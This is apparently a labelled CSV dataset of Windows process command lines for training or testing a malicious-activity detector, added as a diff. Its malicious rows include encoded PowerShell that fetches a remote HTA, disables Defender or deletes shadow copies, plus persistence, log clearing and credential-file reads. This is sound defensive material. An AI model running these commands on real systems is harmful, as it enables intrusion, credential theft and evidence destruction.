@@ -1,0 +1,221 @@
+process_name,command_line,label
+powershell.exe,Get-Service | Where-Object Status -eq Running,benign
+git.exe,git commit -am 'chore: bump jq',benign
+systeminfo.exe,systeminfo,benign
+curl.exe,curl.exe -s http://localhost:5000/health,benign
+powershell.exe,Get-Process | Sort-Object CPU -Descending | Select -First 10,benign
+dotnet.exe,dotnet build infra.sln -c Release,benign
+ipconfig.exe,ipconfig /all,benign
+powershell.exe,powershell -nop -w hidden -enc bQBzAGgAdABhACAAaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4AMQA1ADkALwBpAC4AaAB0AGEA,malicious
+git.exe,git status,benign
+powershell.exe,Get-EventLog -LogName Application -Newest 20,benign
+pip.exe,pip install -r requirements.txt,benign
+powershell.exe,Get-ChildItem C:\Users\backupadmin\Documents,benign
+sqlcmd.exe,"sqlcmd -S db -d nginx -Q ""SELECT COUNT(*) FROM dbo.Orders""",benign
+tasklist.exe,tasklist /fo table,benign
+sc.exe,sc query api-gateway,benign
+kubectl.exe,kubectl get pods -n production,benign
+nuget.exe,nuget restore data-pipeline.sln,benign
+git.exe,git pull origin hotfix/login,benign
+git.exe,git commit -am 'chore: bump openjdk-17-jdk',benign
+robocopy.exe,robocopy C:\build\dist \\web\redis /MIR /NFL,benign
+docker.exe,docker build -t worker:16 .,benign
+powershell.exe,powershell -nop -w hidden -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAHcAIABoAGkAZABkAGUAbgAgAC0AZQBuAGMAIABTAFEAQgBGAEEARgBnAEEASQBBAEEAbwBBAEcANABBAFoAUQBCADMAQQBDADAAQQBiAHcAbgA=,malicious
+powershell.exe,Test-Connection -Count 2 db-45,benign
+where.exe,where python,benign
+python.exe,python -m pytest tests\ -q,benign
+dotnet.exe,dotnet test,benign
+git.exe,git commit -am 'chore: bump python3-pip',benign
+schtasks.exe,schtasks /create /sc minute /mo 10 /tn UpdateSync /tr C:\Windows\Temp\telemetry.exe /f,malicious
+nuget.exe,nuget restore billing-service.sln,benign
+dotnet.exe,dotnet build billing-service.sln -c Release,benign
+robocopy.exe,robocopy C:\build\dist \\web\payments /MIR /NFL,benign
+docker.exe,docker build -t postgres:57 .,benign
+robocopy.exe,robocopy C:\build\dist \\web\search /MIR /NFL,benign
+powershell.exe,Restart-Service -Name auth-svc,benign
+nuget.exe,nuget restore mobile-api.sln,benign
+powershell.exe,Test-Connection -Count 2 db-79,benign
+sqlcmd.exe,"sqlcmd -S db -d api-gateway -Q ""SELECT COUNT(*) FROM dbo.Orders""",benign
+explorer.exe,explorer C:\Users\backupadmin\Downloads,benign
+msbuild.exe,msbuild /t:Rebuild /p:Configuration=Release,benign
+reg.exe,reg add HKLM\System\CurrentControlSet\Services\Upd /v ImagePath /d C:\Windows\Temp\telemetry.exe /f,malicious
+git.exe,git pull origin develop,benign
+sc.exe,sc query postgres,benign
+net.exe,net use Z: \\fileserver\share,benign
+powershell.exe,Restart-Service -Name redis,benign
+docker.exe,docker ps -a,benign
+powershell.exe,powershell -nop -w hidden -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAGMAIABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA==,malicious
+powershell.exe,Test-Connection -Count 2 db-18,benign
+powershell.exe,Test-Connection -Count 2 db-72,benign
+docker.exe,docker build -t worker:38 .,benign
+powershell.exe,Restart-Service -Name search,benign
+robocopy.exe,robocopy C:\build\dist \\web\worker /MIR /NFL,benign
+powershell.exe,Test-Connection -Count 2 db-30,benign
+powershell.exe,Restart-Service -Name api-gateway,benign
+sqlcmd.exe,"sqlcmd -S db -d search -Q ""SELECT COUNT(*) FROM dbo.Orders""",benign
+git.exe,git pull origin release/2.4,benign
+choco.exe,choco install openjdk-17-jdk -y,benign
+sc.exe,sc query nginx,benign
+nuget.exe,nuget restore web-app.sln,benign
+powershell.exe,Test-Connection -Count 2 db-11,benign
+robocopy.exe,robocopy C:\build\dist \\web\nginx /MIR /NFL,benign
+git.exe,git commit -am 'chore: bump htop',benign
+powershell.exe,Test-Connection -Count 2 db-15,benign
+dotnet.exe,dotnet build platform.sln -c Release,benign
+net.exe,net view /all,malicious
+powershell.exe,Test-Connection -Count 2 db-56,benign
+nuget.exe,nuget restore infra.sln,benign
+powershell.exe,Test-Connection -Count 2 db-73,benign
+docker.exe,docker build -t postgres:10 .,benign
+choco.exe,choco install git-lfs -y,benign
+powershell.exe,Test-Connection -Count 2 db-38,benign
+powershell.exe,Test-Connection -Count 2 db-74,benign
+git.exe,git commit -am 'chore: bump git-lfs',benign
+sqlcmd.exe,"sqlcmd -S db -d postgres -Q ""SELECT COUNT(*) FROM dbo.Orders""",benign
+docker.exe,docker build -t search:29 .,benign
+powershell.exe,powershell -nop -w hidden -enc dgBzAHMAYQBkAG0AaQBuACAAZABlAGwAZQB0AGUAIABzAGgAYQBkAG8AdwBzACAALwBhAGwAbAAgAC8AcQB1AGkAZQB0AA==,malicious
+powershell.exe,Restart-Service -Name nginx,benign
+dotnet.exe,dotnet build data-pipeline.sln -c Release,benign
+dotnet.exe,dotnet build web-app.sln -c Release,benign
+git.exe,git commit -am 'chore: bump nodejs',benign
+sqlcmd.exe,"sqlcmd -S db -d redis -Q ""SELECT COUNT(*) FROM dbo.Orders""",benign
+docker.exe,docker build -t auth-svc:32 .,benign
+powershell.exe,powershell -nop -w hidden -enc YwBlAHIAdAB1AHQAaQBsACAALQBlAG4AYwBvAGQAZQAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAZABvAGMAcwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAdABlAGwAZQBtAGUAdAByAHkALgB6AGkAcAA=,malicious
+choco.exe,choco install ripgrep -y,benign
+sqlcmd.exe,"sqlcmd -S db -d payments -Q ""SELECT COUNT(*) FROM dbo.Orders""",benign
+sqlcmd.exe,"sqlcmd -S db -d worker -Q ""SELECT COUNT(*) FROM dbo.Orders""",benign
+powershell.exe,Restart-Service -Name worker,benign
+powershell.exe,Test-Connection -Count 2 db-12,benign
+docker.exe,docker build -t nginx:93 .,benign
+sc.exe,sc query payments,benign
+powershell.exe,Test-Connection -Count 2 db-77,benign
+git.exe,git pull origin feature/checkout,benign
+docker.exe,docker build -t postgres:63 .,benign
+robocopy.exe,robocopy C:\build\dist \\web\auth-svc /MIR /NFL,benign
+git.exe,git pull origin main,benign
+cmd.exe,cmd /c copy C:\Windows\Temp\NOTE.txt %PUBLIC%\READ_ME.txt,malicious
+docker.exe,docker build -t search:57 .,benign
+dotnet.exe,dotnet build mobile-api.sln -c Release,benign
+docker.exe,docker build -t postgres:52 .,benign
+powershell.exe,Test-Connection -Count 2 db-26,benign
+powershell.exe,Test-Connection -Count 2 db-7,benign
+git.exe,git commit -am 'chore: bump ripgrep',benign
+powershell.exe,Test-Connection -Count 2 db-90,benign
+sqlcmd.exe,"sqlcmd -S db -d auth-svc -Q ""SELECT COUNT(*) FROM dbo.Orders""",benign
+docker.exe,docker build -t postgres:64 .,benign
+nuget.exe,nuget restore platform.sln,benign
+powershell.exe,Test-Connection -Count 2 db-64,benign
+net.exe,net localgroup administrators,malicious
+robocopy.exe,robocopy C:\build\dist \\web\api-gateway /MIR /NFL,benign
+sc.exe,sc query worker,benign
+choco.exe,choco install htop -y,benign
+choco.exe,choco install python3-pip -y,benign
+powershell.exe,Test-Connection -Count 2 db-5,benign
+choco.exe,choco install nodejs -y,benign
+powershell.exe,Test-Connection -Count 2 db-50,benign
+docker.exe,docker build -t nginx:89 .,benign
+powershell.exe,Test-Connection -Count 2 db-9,benign
+sc.exe,sc query auth-svc,benign
+powershell.exe,Test-Connection -Count 2 db-86,benign
+choco.exe,choco install jq -y,benign
+tasklist.exe,tasklist /v /fo csv,malicious
+powershell.exe,Test-Connection -Count 2 db-24,benign
+docker.exe,docker build -t redis:60 .,benign
+docker.exe,docker build -t search:16 .,benign
+docker.exe,docker build -t api-gateway:58 .,benign
+wevtutil.exe,wevtutil cl Security,malicious
+robocopy.exe,robocopy C:\build\dist \\web\postgres /MIR /NFL,benign
+powershell.exe,Test-Connection -Count 2 db-19,benign
+sc.exe,sc query redis,benign
+docker.exe,docker build -t nginx:44 .,benign
+powershell.exe,Test-Connection -Count 2 db-75,benign
+powershell.exe,Test-Connection -Count 2 db-89,benign
+docker.exe,docker build -t auth-svc:59 .,benign
+powershell.exe,"powershell -nop -c ""Get-ChildItem -Recurse -Include *.kdbx,*.pem $env:USERPROFILE""",malicious
+docker.exe,docker build -t search:28 .,benign
+docker.exe,docker build -t postgres:5 .,benign
+docker.exe,docker build -t worker:5 .,benign
+docker.exe,docker build -t payments:27 .,benign
+docker.exe,docker build -t auth-svc:80 .,benign
+powershell.exe,Test-Connection -Count 2 db-68,benign
+docker.exe,docker build -t search:46 .,benign
+powershell.exe,Test-Connection -Count 2 db-78,benign
+powershell.exe,Test-Connection -Count 2 db-70,benign
+docker.exe,docker build -t payments:16 .,benign
+powershell.exe,Test-Connection -Count 2 db-94,benign
+powershell.exe,Test-Connection -Count 2 db-93,benign
+docker.exe,docker build -t auth-svc:42 .,benign
+type,type %USERPROFILE%\.aws\credentials,malicious
+docker.exe,docker build -t redis:92 .,benign
+powershell.exe,Test-Connection -Count 2 db-85,benign
+docker.exe,docker build -t auth-svc:44 .,benign
+docker.exe,docker build -t api-gateway:85 .,benign
+docker.exe,docker build -t api-gateway:35 .,benign
+powershell.exe,Restart-Service -Name postgres,benign
+docker.exe,docker build -t worker:75 .,benign
+docker.exe,docker build -t payments:15 .,benign
+powershell.exe,Test-Connection -Count 2 db-53,benign
+powershell.exe,Restart-Service -Name payments,benign
+docker.exe,docker build -t auth-svc:52 .,benign
+sc.exe,sc query search,benign
+powershell.exe,Test-Connection -Count 2 db-13,benign
+docker.exe,docker build -t nginx:36 .,benign
+docker.exe,docker build -t worker:71 .,benign
+net.exe,net localgroup administrators # 9029,malicious
+docker.exe,docker build -t auth-svc:84 .,benign
+docker.exe,docker build -t api-gateway:53 .,benign
+docker.exe,docker build -t search:35 .,benign
+docker.exe,docker build -t api-gateway:72 .,benign
+docker.exe,docker build -t nginx:76 .,benign
+powershell.exe,Test-Connection -Count 2 db-21,benign
+powershell.exe,Test-Connection -Count 2 db-23,benign
+docker.exe,docker build -t payments:31 .,benign
+docker.exe,docker build -t nginx:9 .,benign
+docker.exe,docker build -t worker:83 .,benign
+powershell.exe,Test-Connection -Count 2 db-98,benign
+tasklist.exe,tasklist /v /fo csv # 6776,malicious
+docker.exe,docker build -t nginx:72 .,benign
+docker.exe,docker build -t worker:84 .,benign
+docker.exe,docker build -t postgres:28 .,benign
+docker.exe,docker build -t auth-svc:65 .,benign
+docker.exe,docker build -t search:71 .,benign
+powershell.exe,Test-Connection -Count 2 db-22,benign
+powershell.exe,"powershell -nop -c ""Clear-EventLog -LogName Security""",malicious
+powershell.exe,Test-Connection -Count 2 db-1,benign
+docker.exe,docker build -t worker:41 .,benign
+powershell.exe,Test-Connection -Count 2 db-20,benign
+docker.exe,docker build -t auth-svc:33 .,benign
+powershell.exe,Test-Connection -Count 2 db-71,benign
+powershell.exe,Test-Connection -Count 2 db-34,benign
+docker.exe,docker build -t nginx:19 .,benign
+docker.exe,docker build -t api-gateway:16 .,benign
+docker.exe,docker build -t payments:19 .,benign
+docker.exe,docker build -t auth-svc:20 .,benign
+docker.exe,docker build -t search:20 .,benign
+docker.exe,docker build -t nginx:81 .,benign
+powershell.exe,Test-Connection -Count 2 db-35,benign
+powershell.exe,"powershell -nop -c ""Get-ChildItem -Recurse -Include *.kdbx,*.pem $env:USERPROFILE"" # 1435",malicious
+powershell.exe,Test-Connection -Count 2 db-59,benign
+docker.exe,docker build -t postgres:47 .,benign
+docker.exe,docker build -t nginx:43 .,benign
+powershell.exe,Test-Connection -Count 2 db-91,benign
+docker.exe,docker build -t worker:31 .,benign
+docker.exe,docker build -t api-gateway:84 .,benign
+type,type %USERPROFILE%\.aws\credentials # 2094,malicious
+powershell.exe,Test-Connection -Count 2 db-32,benign
+powershell.exe,Test-Connection -Count 2 db-6,benign
+docker.exe,docker build -t auth-svc:94 .,benign
+powershell.exe,Test-Connection -Count 2 db-88,benign
+powershell.exe,Test-Connection -Count 2 db-95,benign
+docker.exe,docker build -t postgres:11 .,benign
+powershell.exe,Test-Connection -Count 2 db-31,benign
+docker.exe,docker build -t api-gateway:56 .,benign
+docker.exe,docker build -t search:81 .,benign
+powershell.exe,Test-Connection -Count 2 db-25,benign
+docker.exe,docker build -t api-gateway:83 .,benign
+net.exe,net localgroup administrators # 4142,malicious
+docker.exe,docker build -t payments:69 .,benign
+docker.exe,docker build -t redis:83 .,benign
+docker.exe,docker build -t search:66 .,benign
+docker.exe,docker build -t redis:3 .,benign
+docker.exe,docker build -t search:24 .,benign
